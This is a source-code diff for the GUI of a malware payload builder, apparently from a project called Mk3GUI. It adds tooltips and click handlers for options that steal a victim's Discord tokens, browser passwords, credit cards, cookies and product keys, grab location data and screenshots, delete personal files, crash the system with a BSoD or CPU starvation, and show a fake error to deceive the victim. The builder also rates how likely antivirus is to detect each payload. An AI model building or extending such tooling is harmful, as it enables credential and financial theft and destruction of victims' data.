@@ -33,16 +33,38 @@ namespace Mk3GUI
         private void Window_Initialized(object sender, EventArgs e)
         {
 
-            ErrorMessageTitle.ToolTip = new ToolTip { Content = "Sets a title for the \"Fake Error Msg\" pop-up." };
-            ErrorMessageDescription.ToolTip = new ToolTip { Content = "Sets a description for the \"Fake Error Msg\" pop-up." };
-            DetectionPercentage.ToolTip = new ToolTip { Content = "Arbitrary value of how likely it will be for an antivirus to detect this payload's feature set." };
+            ErrorMessageTitle.ToolTip = new ToolTip { Content = "Sets a title for the \"Fake Error Msg\" pop-up.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            ErrorMessageDescription.ToolTip = new ToolTip { Content = "Sets a description for the \"Fake Error Msg\" pop-up.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            DetectionPercentage.ToolTip = new ToolTip { Content = "Arbitrary value of how likely it will be for an antivirus to detect this payload's feature set.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
 
-            CompileButton.ToolTip = new ToolTip { Content = "Build a payload based on the feature set you've selected." };
-            SaveConfigButton.ToolTip = new ToolTip { Content = "Save the current payload configuration to a file to be used later." };
-            LoadConfigButton.ToolTip = new ToolTip { Content = "Load a payload configuration from a file." };
-            GithubButton.ToolTip = new ToolTip { Content = "Visit us on GitHub." };
-            DiscordButton.ToolTip = new ToolTip { Content = "Join the official Studio 7 Discord server." };
-            HelpButton.ToolTip = new ToolTip { Content = "Need help on what to do? Click here to be taken to the tutorial." };
+            CompileButton.ToolTip = new ToolTip { Content = "Build a payload based on the feature set you've selected.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            SaveConfigButton.ToolTip = new ToolTip { Content = "Save the current payload configuration to a file to be used later.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            LoadConfigButton.ToolTip = new ToolTip { Content = "Load a payload configuration from a file.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            GithubButton.ToolTip = new ToolTip { Content = "Visit us on GitHub.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            DiscordButton.ToolTip = new ToolTip { Content = "Join the official Studio 7 Discord server.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            HelpButton.ToolTip = new ToolTip { Content = "Need help on what to do? Click here to be taken to the tutorial.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+
+            // Silent Checkboxes Click Event
+            CoordDumpCheckBox.ToolTip = new ToolTip { Content = "Get's the precise geo-coordinates to the vitim's current location without using GPS.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            IpGrabCheckBox.ToolTip = new ToolTip { Content = "Get's the victim's IPv4 address & geo information.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            CompInfoCheckBox.ToolTip = new ToolTip { Content = "Get's the victim's basic system hardware and software information.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            FakeErrorCheckBox.ToolTip = new ToolTip { Content = "Shows a fake error message when the payload is ran.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+
+            // Loud Checkboxes Click Event
+            TokenGrabberCheckBox.ToolTip = new ToolTip { Content = "Grabs the victim's Discord token(s).", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            ScreenshotCheckBox.ToolTip = new ToolTip { Content = "Takes a screenshot of the victim's desktop at the time of running the payload.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            BSoDCheckBox.ToolTip = new ToolTip { Content = "Triggers a windows Blue Screen of Death (BSoD) with an error code of OxDEADFEED.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            StarveSysCheckBox.ToolTip = new ToolTip { Content = "Starves the CPU of resources until the system crashes (Lag Machine).", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            KillDesktopCheckBox.ToolTip = new ToolTip { Content = "Temporarily disables the victim's desktop.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            ShutdownCheckBox.ToolTip = new ToolTip { Content = "Turns off the victim's machine.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+
+            // Nuclear Checkboxes Click Event
+            PasswordDumpCheckBox.ToolTip = new ToolTip { Content = "Grabs the victim's saved passwords from over 25 different browsers.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            DeletePersonalCheckBox.ToolTip = new ToolTip { Content = "Deletes all of the victim's personal files (Documents, Pictures & Videos).", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            NukeDesktopCheckBox.ToolTip = new ToolTip { Content = "Deletes any files on the victim's desktop.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            ChromeCardDumpCheckBox.ToolTip = new ToolTip { Content = "Grabs the victim's saved credit card information from over 25 different browsers.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            StealKeyCheckBox.ToolTip = new ToolTip { Content = "Grabs the victim's product key and activation type.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
+            CookieDumpCheckBox.ToolTip = new ToolTip { Content = "Grabs all of the victim's cookies (only enable if needed; this will generate significantly larger dumps).", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
 
 
             // Silent Checkboxes Click Event
@@ -55,6 +77,7 @@ namespace Mk3GUI
             TokenGrabberCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
             ScreenshotCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
             BSoDCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
+            StarveSysCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
             KillDesktopCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
             ShutdownCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
 
@@ -77,6 +100,7 @@ namespace Mk3GUI
             TokenGrabberCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
             ScreenshotCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
             BSoDCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
+            StarveSysCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
             KillDesktopCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
             ShutdownCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
 
@@ -101,6 +125,7 @@ namespace Mk3GUI
             TokenGrabberCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
             ScreenshotCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
             BSoDCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
+            StarveSysCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
             KillDesktopCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
             ShutdownCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
 
@@ -257,6 +282,10 @@ namespace Mk3GUI
                 
                 case "BSoDCheckBox":
                     context = "BSoD";
+                    break;
+
+                case "StarveSysCheckBox":
+                    context = "StarveSystem";
                     break;
                 
                 case "KillDesktopCheckBox":
